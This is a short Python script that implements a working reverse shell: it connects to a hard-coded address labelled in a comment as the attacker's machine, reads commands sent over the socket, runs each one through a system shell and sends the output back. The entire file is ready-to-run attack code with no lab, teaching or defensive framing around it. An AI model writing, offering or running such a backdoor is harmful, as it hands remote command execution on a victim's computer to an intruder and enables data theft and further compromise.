#!/usr/bin/env python3
import socket
import subprocess
import os

def reverse_shell():
    host = "10.162.6.102"
    port = 3399
    
    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # Connect to attacker's machine
        sock.connect((host, port))
        
        # Start an interactive shell
        while True:
            # Send current working directory and prompt
            cmd = f"{os.getcwd()}> "
            sock.send(cmd.encode())
            
            # Get command from attacker
            data = sock.recv(4096).decode().strip()
            if not data:
                break
                
            # Execute command
            result = subprocess.run(data, shell=True, capture_output=True)
            output = result.stdout.decode() + result.stderr.decode()
            
            # Send results back
            sock.send(output.encode())
            
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    reverse_shell()
